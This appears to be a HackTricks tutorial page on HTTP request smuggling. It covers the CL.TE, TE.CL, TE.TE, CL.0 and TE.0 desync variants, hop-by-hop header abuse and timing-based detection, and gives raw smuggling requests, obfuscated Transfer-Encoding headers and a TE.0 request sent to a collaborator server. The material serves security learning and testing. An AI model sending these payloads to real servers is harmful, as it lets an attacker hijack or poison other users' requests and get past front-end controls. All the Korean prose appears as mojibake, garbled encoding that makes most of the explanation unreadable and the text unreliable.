# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš”** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ë¬´ì—‡ì¸ê°€

ì´ ì·¨ì•½ì ì€ **í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œ**ì™€ **ë°±ì—”ë“œ** ì„œë²„ ê°„ì˜ **ë¹„ë™ê¸°í™”**ë¡œ ì¸í•´ **ê³µê²©ì**ê°€ HTTP **ìš”ì²­**ì„ **ì „ì†¡**í•  ìˆ˜ ìˆê²Œ ë˜ë©°, ì´ ìš”ì²­ì€ **í”„ë¡ íŠ¸ì—”ë“œ** í”„ë¡ì‹œ(ë¡œë“œ ë°¸ëŸ°ìŠ¤/ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ)ì—ì„œëŠ” **ë‹¨ì¼ ìš”ì²­**ìœ¼ë¡œ **í•´ì„**ë˜ê³  **ë°±ì—”ë“œ** ì„œë²„ì—ì„œëŠ” **2ê°œì˜ ìš”ì²­**ìœ¼ë¡œ **í•´ì„**ë©ë‹ˆë‹¤.\
ì´ë¡œ ì¸í•´ ì‚¬ìš©ìëŠ” ìì‹ ì˜ ìš”ì²­ ì´í›„ì— ë°±ì—”ë“œ ì„œë²„ì— ë„ì°©í•˜ëŠ” **ë‹¤ìŒ ìš”ì²­ì„ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì´ë¡ 

[**RFC ì‚¬ì–‘ (2161)**](https://tools.ietf.org/html/rfc2616)

> ë©”ì‹œì§€ê°€ Transfer-Encoding í—¤ë” í•„ë“œì™€ Content-Length í—¤ë” í•„ë“œë¥¼ ëª¨ë‘ í¬í•¨í•˜ì—¬ ìˆ˜ì‹ ë˜ë©´, í›„ìëŠ” ë¬´ì‹œí•´ì•¼ í•©ë‹ˆë‹¤.

**Content-Length**

> Content-Length ì—”í„°í‹° í—¤ë”ëŠ” ìˆ˜ì‹ ìì—ê²Œ ì „ì†¡ëœ ì—”í„°í‹° ë³¸ë¬¸ì˜ í¬ê¸°ë¥¼ ë°”ì´íŠ¸ ë‹¨ìœ„ë¡œ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

**Transfer-Encoding: chunked**

> Transfer-Encoding í—¤ë”ëŠ” í˜ì´ë¡œë“œ ë³¸ë¬¸ì„ ì‚¬ìš©ìì—ê²Œ ì•ˆì „í•˜ê²Œ ì „ì†¡í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì¸ì½”ë”© í˜•ì‹ì„ ì§€ì •í•©ë‹ˆë‹¤.\
> ChunkedëŠ” í° ë°ì´í„°ê°€ ì¼ë ¨ì˜ ì²­í¬ë¡œ ì „ì†¡ë¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

### í˜„ì‹¤

**í”„ë¡ íŠ¸ì—”ë“œ**(ë¡œë“œ ë°¸ëŸ°ìŠ¤/ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ)ëŠ” _**content-length**_ ë˜ëŠ” _**transfer-encoding**_ í—¤ë”ë¥¼ **ì²˜ë¦¬**í•˜ê³  **ë°±ì—”ë“œ** ì„œë²„ëŠ” **ë‹¤ë¥¸** í•˜ë‚˜ë¥¼ **ì²˜ë¦¬**í•˜ì—¬ ë‘ ì‹œìŠ¤í…œ ê°„ì˜ **ë¹„ë™ê¸°í™”**ë¥¼ ìœ ë°œí•©ë‹ˆë‹¤.\
ì´ëŠ” **ê³µê²©ìê°€ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ**ì— **í•˜ë‚˜ì˜ ìš”ì²­ì„ ì „ì†¡**í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ **ë°±ì—”ë“œ** ì„œë²„ê°€ ì´ë¥¼ **2ê°œì˜ ì„œë¡œ ë‹¤ë¥¸ ìš”ì²­ìœ¼ë¡œ í•´ì„**í•˜ê²Œ í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë§¤ìš° ì¹˜ëª…ì ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì˜ **ìœ„í—˜**ì€ **ë°±ì—”ë“œ** ì„œë²„ê°€ **ì£¼ì…ëœ 2ë²ˆì§¸ ìš”ì²­**ì„ **ë‹¤ìŒ í´ë¼ì´ì–¸íŠ¸**ì—ì„œ ì˜¨ ê²ƒì²˜ëŸ¼ **í•´ì„**í•˜ê³  ê·¸ í´ë¼ì´ì–¸íŠ¸ì˜ **ì‹¤ì œ ìš”ì²­**ì´ **ì£¼ì…ëœ ìš”ì²­**ì˜ **ì¼ë¶€**ê°€ ëœë‹¤ëŠ” ì‚¬ì‹¤ì— ìˆìŠµë‹ˆë‹¤.

### íŠ¹ì´ì‚¬í•­

HTTPì—ì„œ **ìƒˆ ì¤„ ë¬¸ìëŠ” 2ë°”ì´íŠ¸ë¡œ êµ¬ì„±ë©ë‹ˆë‹¤:**

* **Content-Length**: ì´ í—¤ë”ëŠ” ìš”ì²­ ë³¸ë¬¸ì˜ **ë°”ì´íŠ¸ ìˆ˜**ë¥¼ ë‚˜íƒ€ë‚´ê¸° ìœ„í•´ **10ì§„ìˆ˜**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë³¸ë¬¸ì€ ë§ˆì§€ë§‰ ë¬¸ìì—ì„œ ëë‚˜ëŠ” ê²ƒìœ¼ë¡œ ì˜ˆìƒë˜ë©°, **ìš”ì²­ ëì— ìƒˆ ì¤„ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* **Transfer-Encoding:** ì´ í—¤ë”ëŠ” **ë‹¤ìŒ ì²­í¬**ì˜ **ë°”ì´íŠ¸ ìˆ˜**ë¥¼ ë‚˜íƒ€ë‚´ê¸° ìœ„í•´ ë³¸ë¬¸ì—ì„œ **16ì§„ìˆ˜**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. **ì²­í¬**ëŠ” **ìƒˆ ì¤„**ë¡œ **ëë‚˜ì•¼** í•˜ì§€ë§Œ ì´ ìƒˆ ì¤„ì€ **ê¸¸ì´ í‘œì‹œê¸°**ì— ì˜í•´ **ê³„ì‚°ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ ì „ì†¡ ë°©ë²•ì€ **í¬ê¸° 0ì˜ ì²­í¬ë¡œ ëë‚˜ê³  2ê°œì˜ ìƒˆ ì¤„ì´ ë’¤ë”°ë¼ì•¼** í•©ë‹ˆë‹¤: `0`
* **Connection**: ì œ ê²½í—˜ì— ë”°ë¥´ë©´ ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ì˜ ì²« ë²ˆì§¸ ìš”ì²­ì—ì„œ **`Connection: keep-alive`**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

## ê¸°ë³¸ ì˜ˆì œ

{% hint style="success" %}
Burp Suiteë¡œ ì´ë¥¼ ì•…ìš©í•˜ë ¤ê³  í•  ë•Œ **ë¦¬í”¼í„°ì—ì„œ `Update Content-Length` ë° `Normalize HTTP/1 line endings`ë¥¼ ë¹„í™œì„±í™”**í•˜ì„¸ìš”. ì¼ë¶€ ë„êµ¬ëŠ” ìƒˆ ì¤„, ìºë¦¬ì§€ ë¦¬í„´ ë° ì˜ëª»ëœ content-lengthë¥¼ ë‚¨ìš©í•©ë‹ˆë‹¤.
{% endhint %}

HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ ê³µê²©ì€ `Content-Length` (CL) ë° `Transfer-Encoding` (TE) í—¤ë”ë¥¼ í•´ì„í•˜ëŠ” í”„ë¡ íŠ¸ì—”ë“œì™€ ë°±ì—”ë“œ ì„œë²„ ê°„ì˜ ë¶ˆì¼ì¹˜ë¥¼ ì´ìš©í•˜ì—¬ ëª¨í˜¸í•œ ìš”ì²­ì„ ì „ì†¡í•¨ìœ¼ë¡œì¨ ë§Œë“¤ì–´ì§‘ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ ì£¼ë¡œ **CL.TE**, **TE.CL**, ë° **TE.TE** í˜•íƒœë¡œ ë‚˜íƒ€ë‚  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê° ìœ í˜•ì€ í”„ë¡ íŠ¸ì—”ë“œì™€ ë°±ì—”ë“œ ì„œë²„ê°€ ì´ëŸ¬í•œ í—¤ë”ë¥¼ ìš°ì„ ì‹œí•˜ëŠ” ë°©ì‹ì˜ ê³ ìœ í•œ ì¡°í•©ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì·¨ì•½ì ì€ ì„œë²„ê°€ ë™ì¼í•œ ìš”ì²­ì„ ì„œë¡œ ë‹¤ë¥¸ ë°©ì‹ìœ¼ë¡œ ì²˜ë¦¬í•˜ì—¬ ì˜ˆìƒì¹˜ ëª»í•œ ê²°ê³¼ë¥¼ ì´ˆë˜í•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤.

### ì·¨ì•½ì  ìœ í˜•ì˜ ê¸°ë³¸ ì˜ˆì œ

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
ì´ì „ í‘œì— TE.0 ê¸°ìˆ ì„ ì¶”ê°€í•´ì•¼ í•˜ë©°, CL.0 ê¸°ìˆ ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ Transfer Encodingì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
{% endhint %}

#### CL.TE ì·¨ì•½ì  (í”„ë¡ íŠ¸ì—”ë“œì—ì„œ ì‚¬ìš©ëœ Content-Length, ë°±ì—”ë“œì—ì„œ ì‚¬ìš©ëœ Transfer-Encoding)

* **í”„ë¡ íŠ¸ì—”ë“œ (CL):** `Content-Length` í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
* **ë°±ì—”ë“œ (TE):** `Transfer-Encoding` í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
* **ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**
* ê³µê²©ìê°€ `Content-Length` í—¤ë”ì˜ ê°’ì´ ì‹¤ì œ ì½˜í…ì¸  ê¸¸ì´ì™€ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.
* í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” `Content-Length` ê°’ì„ ê¸°ë°˜ìœ¼ë¡œ ì „ì²´ ìš”ì²­ì„ ë°±ì—”ë“œë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.
* ë°±ì—”ë“œ ì„œë²„ëŠ” `Transfer-Encoding: chunked` í—¤ë”ë¡œ ì¸í•´ ìš”ì²­ì„ ì²­í¬ë¡œ ì²˜ë¦¬í•˜ì—¬ ë‚˜ë¨¸ì§€ ë°ì´í„°ë¥¼ ë³„ë„ì˜ í›„ì† ìš”ì²­ìœ¼ë¡œ í•´ì„í•©ë‹ˆë‹¤.
*   **ì˜ˆì œ:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL ì·¨ì•½ì  (í”„ë¡ íŠ¸ì—”ë“œì—ì„œ ì‚¬ìš©ëœ Transfer-Encoding, ë°±ì—”ë“œì—ì„œ ì‚¬ìš©ëœ Content-Length)

* **í”„ë¡ íŠ¸ì—”ë“œ (TE):** `Transfer-Encoding` í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
* **ë°±ì—”ë“œ (CL):** `Content-Length` í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
* **ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**
* ê³µê²©ìê°€ ì²­í¬ í¬ê¸°(`7b`)ì™€ ì‹¤ì œ ì½˜í…ì¸  ê¸¸ì´(`Content-Length: 4`)ê°€ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ì²­í¬ ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.
* í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” `Transfer-Encoding`ì„ ì¡´ì¤‘í•˜ì—¬ ì „ì²´ ìš”ì²­ì„ ë°±ì—”ë“œë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.
* ë°±ì—”ë“œ ì„œë²„ëŠ” `Content-Length`ë¥¼ ì¡´ì¤‘í•˜ì—¬ ìš”ì²­ì˜ ì´ˆê¸° ë¶€ë¶„(`7b` ë°”ì´íŠ¸)ë§Œ ì²˜ë¦¬í•˜ê³  ë‚˜ë¨¸ì§€ëŠ” ì˜ë„í•˜ì§€ ì•Šì€ í›„ì† ìš”ì²­ì˜ ì¼ë¶€ë¡œ ë‚¨ê¹ë‹ˆë‹¤.
*   **ì˜ˆì œ:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE ì·¨ì•½ì  (ë‘˜ ë‹¤ Transfer-Encodingì„ ì‚¬ìš©í•˜ë©°, ë‚œë…í™”)

* **ì„œë²„:** ë‘˜ ë‹¤ `Transfer-Encoding`ì„ ì§€ì›í•˜ì§€ë§Œ, í•˜ë‚˜ëŠ” ë‚œë…í™”ë¥¼ í†µí•´ ì´ë¥¼ ë¬´ì‹œí•˜ë„ë¡ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**
* ê³µê²©ìê°€ ë‚œë…í™”ëœ `Transfer-Encoding` í—¤ë”ê°€ ìˆëŠ” ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.
* ì–´ë–¤ ì„œë²„(í”„ë¡ íŠ¸ì—”ë“œ ë˜ëŠ” ë°±ì—”ë“œ)ê°€ ë‚œë…í™”ë¥¼ ì¸ì‹í•˜ì§€ ëª»í•˜ëŠ”ì§€ì— ë”°ë¼ CL.TE ë˜ëŠ” TE.CL ì·¨ì•½ì ì´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìš”ì²­ì˜ ì²˜ë¦¬ë˜ì§€ ì•Šì€ ë¶€ë¶„ì€ ì„œë²„ ì¤‘ í•˜ë‚˜ì—ì„œ í›„ì† ìš”ì²­ì˜ ì¼ë¶€ê°€ ë˜ì–´ ìŠ¤ë¨¸ê¸€ë§ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.
*   **ì˜ˆì œ:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL ì‹œë‚˜ë¦¬ì˜¤ (í”„ë¡ íŠ¸ì—”ë“œì™€ ë°±ì—”ë“œ ëª¨ë‘ì—ì„œ ì‚¬ìš©ëœ Content-Length)**

* ë‘ ì„œë²„ëŠ” ìš”ì²­ì„ ì˜¤ì§ `Content-Length` í—¤ë”ë§Œ ê¸°ë°˜ìœ¼ë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤.
* ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ìŠ¤ë¨¸ê¸€ë§ìœ¼ë¡œ ì´ì–´ì§€ì§€ ì•Šìœ¼ë©°, ë‘ ì„œë²„ê°€ ìš”ì²­ ê¸¸ì´ë¥¼ í•´ì„í•˜ëŠ” ë°©ì‹ì´ ì¼ì¹˜í•©ë‹ˆë‹¤.
*   **ì˜ˆì œ:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 ì‹œë‚˜ë¦¬ì˜¤**

* `Content-Length` í—¤ë”ê°€ ì¡´ì¬í•˜ê³  0ì´ ì•„ë‹Œ ê°’ì„ ê°€ì§€ë©° ìš”ì²­ ë³¸ë¬¸ì— ì½˜í…ì¸ ê°€ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë°±ì—”ë“œëŠ” `Content-Length` í—¤ë”ë¥¼ ë¬´ì‹œí•˜ê³ (0ìœ¼ë¡œ ì²˜ë¦¬ë¨), í”„ë¡ íŠ¸ì—”ë“œëŠ” ì´ë¥¼ íŒŒì‹±í•©ë‹ˆë‹¤.
* ì´ëŠ” ìŠ¤ë¨¸ê¸€ë§ ê³µê²©ì„ ì´í•´í•˜ê³  ë§Œë“œëŠ” ë° ì¤‘ìš”í•˜ë©°, ì„œë²„ê°€ ìš”ì²­ì˜ ëì„ ê²°ì •í•˜ëŠ” ë°©ì‹ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤.
*   **ì˜ˆì œ:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 ì‹œë‚˜ë¦¬ì˜¤

* ì´ì „ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ TEë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* ê¸°ìˆ  [ì—¬ê¸°ì—ì„œ ë³´ê³ ë¨](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **ì˜ˆì œ**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### ì›¹ ì„œë²„ íŒŒê´´

ì´ ê¸°ìˆ ì€ **ì´ˆê¸° HTTP ë°ì´í„°ë¥¼ ì½ëŠ” ë™ì•ˆ ì›¹ ì„œë²„ë¥¼ íŒŒê´´í•  ìˆ˜ ìˆëŠ”** ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ìœ ìš©í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ **ì—°ê²°ì„ ë‹«ì§€ ì•Šê³ ** ì§„í–‰ë©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ HTTP ìš”ì²­ì˜ **ë³¸ë¬¸**ì´ **ë‹¤ìŒ HTTP ìš”ì²­**ìœ¼ë¡œ ê°„ì£¼ë©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, [**ì´ ê¸€**](https://mizu.re/post/twisty-python)ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´, Werkzeugì—ì„œëŠ” ì¼ë¶€ **ìœ ë‹ˆì½”ë“œ** ë¬¸ìë¥¼ ì „ì†¡í•˜ì—¬ ì„œë²„ë¥¼ **íŒŒê´´**í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ HTTP ì—°ê²°ì´ **`Connection: keep-alive`** í—¤ë”ë¡œ ìƒì„±ë˜ì—ˆë‹¤ë©´ ìš”ì²­ì˜ ë³¸ë¬¸ì€ ì½íˆì§€ ì•Šê³  ì—°ê²°ì€ ì—¬ì „íˆ ì—´ë ¤ ìˆìœ¼ë¯€ë¡œ ìš”ì²­ì˜ **ë³¸ë¬¸**ì€ **ë‹¤ìŒ HTTP ìš”ì²­**ìœ¼ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.

#### í™‰-ë°”ì´-í™‰ í—¤ë”ë¥¼ í†µí•œ ê°•ì œí™”

í™‰-ë°”ì´-í™‰ í—¤ë”ë¥¼ ì•…ìš©í•˜ì—¬ í”„ë¡ì‹œì—ê²Œ **Content-Length ë˜ëŠ” Transfer-Encoding í—¤ë”ë¥¼ ì‚­ì œí•˜ë„ë¡ ì§€ì‹œí•˜ì—¬ HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Finding HTTP Request Smuggling

HTTP ìš”ì²­ ë°€ì–´ë‚´ê¸° ì·¨ì•½ì ì„ ì‹ë³„í•˜ëŠ” ê²ƒì€ ì¢…ì¢… íƒ€ì´ë° ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ë‹¬ì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì¡°ì‘ëœ ìš”ì²­ì— ëŒ€í•œ ì„œë²„ì˜ ì‘ë‹µ ì‹œê°„ì„ ê´€ì°°í•˜ëŠ” ë° ì˜ì¡´í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ìˆ ì€ CL.TE ë° TE.CL ì·¨ì•½ì ì„ ê°ì§€í•˜ëŠ” ë° íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°©ë²• ì™¸ì—ë„ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ì „ëµê³¼ ë„êµ¬ê°€ ìˆìŠµë‹ˆë‹¤:

### Finding CL.TE Vulnerabilities Using Timing Techniques

* **Method:**
* ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì·¨ì•½í•œ ê²½ìš°, ë°±ì—”ë“œ ì„œë²„ê°€ ì¶”ê°€ ë°ì´í„°ë¥¼ ê¸°ë‹¤ë¦¬ê²Œ í•˜ëŠ” ìš”ì²­ì„ ì „ì†¡í•©ë‹ˆë‹¤.
*   **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observation:**
* í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” `Content-Length`ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ë©”ì‹œì§€ë¥¼ ì¡°ê¸°ì— ì°¨ë‹¨í•©ë‹ˆë‹¤.
* ë°±ì—”ë“œ ì„œë²„ëŠ” ì²­í¬ ë©”ì‹œì§€ë¥¼ ê¸°ëŒ€í•˜ë©° ë„ì°©í•˜ì§€ ì•ŠëŠ” ë‹¤ìŒ ì²­í¬ë¥¼ ê¸°ë‹¤ë ¤ ì§€ì—°ì´ ë°œìƒí•©ë‹ˆë‹¤.
* **Indicators:**
* ì‘ë‹µì˜ íƒ€ì„ì•„ì›ƒ ë˜ëŠ” ê¸´ ì§€ì—°.
* ë•Œë•Œë¡œ ìƒì„¸í•œ ì„œë²„ ì •ë³´ì™€ í•¨ê»˜ ë°±ì—”ë“œ ì„œë²„ì—ì„œ 400 Bad Request ì˜¤ë¥˜ë¥¼ ìˆ˜ì‹ í•©ë‹ˆë‹¤.

### Finding TE.CL Vulnerabilities Using Timing Techniques

* **Method:**
* ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì·¨ì•½í•œ ê²½ìš°, ë°±ì—”ë“œ ì„œë²„ê°€ ì¶”ê°€ ë°ì´í„°ë¥¼ ê¸°ë‹¤ë¦¬ê²Œ í•˜ëŠ” ìš”ì²­ì„ ì „ì†¡í•©ë‹ˆë‹¤.
*   **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observation:**
* í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” `Transfer-Encoding`ì„ ê¸°ë°˜ìœ¼ë¡œ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ì „ì²´ ë©”ì‹œì§€ë¥¼ ì „ë‹¬í•©ë‹ˆë‹¤.
* ë°±ì—”ë“œ ì„œë²„ëŠ” `Content-Length`ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë©”ì‹œì§€ë¥¼ ê¸°ëŒ€í•˜ë©° ë„ì°©í•˜ì§€ ì•ŠëŠ” ì¶”ê°€ ë°ì´í„°ë¥¼ ê¸°ë‹¤ë ¤ ì§€ì—°ì´ ë°œìƒí•©ë‹ˆë‹¤.

### Other Methods to Find Vulnerabilities

* **Differential Response Analysis:**
* ìš”ì²­ì˜ ì•½ê°„ ë³€í˜•ëœ ë²„ì „ì„ ì „ì†¡í•˜ê³  ì„œë²„ ì‘ë‹µì´ ì˜ˆìƒì¹˜ ëª»í•œ ë°©ì‹ìœ¼ë¡œ ë‹¤ë¥´ê²Œ ë‚˜íƒ€ë‚˜ëŠ”ì§€ ê´€ì°°í•˜ì—¬ êµ¬ë¬¸ ë¶„ì„ ë¶ˆì¼ì¹˜ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* **Using Automated Tools:**
* Burp Suiteì˜ 'HTTP Request Smuggler' í™•ì¥ê³¼ ê°™ì€ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ í˜•íƒœì˜ ëª¨í˜¸í•œ ìš”ì²­ì„ ì „ì†¡í•˜ê³  ì‘ë‹µì„ ë¶„ì„í•˜ì—¬ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ìë™ìœ¼ë¡œ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Content-Length Variance Tests:**
* ì‹¤ì œ ì½˜í…ì¸  ê¸¸ì´ì— ë§ì§€ ì•ŠëŠ” ë‹¤ì–‘í•œ `Content-Length` ê°’ì„ ê°€ì§„ ìš”ì²­ì„ ì „ì†¡í•˜ê³  ì„œë²„ê°€ ì´ëŸ¬í•œ ë¶ˆì¼ì¹˜ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì„ ê´€ì°°í•©ë‹ˆë‹¤.
* **Transfer-Encoding Variance Tests:**
* ë‚œë…í™”ë˜ê±°ë‚˜ ì˜ëª»ëœ `Transfer-Encoding` í—¤ë”ë¥¼ ê°€ì§„ ìš”ì²­ì„ ì „ì†¡í•˜ê³  í”„ë¡ íŠ¸ì—”ë“œ ë° ë°±ì—”ë“œ ì„œë²„ê°€ ì´ëŸ¬í•œ ì¡°ì‘ì— ì–´ë–»ê²Œ ë‹¤ë¥´ê²Œ ë°˜ì‘í•˜ëŠ”ì§€ ëª¨ë‹ˆí„°ë§í•©ë‹ˆë‹¤.

### HTTP Request Smuggling Vulnerability Testing

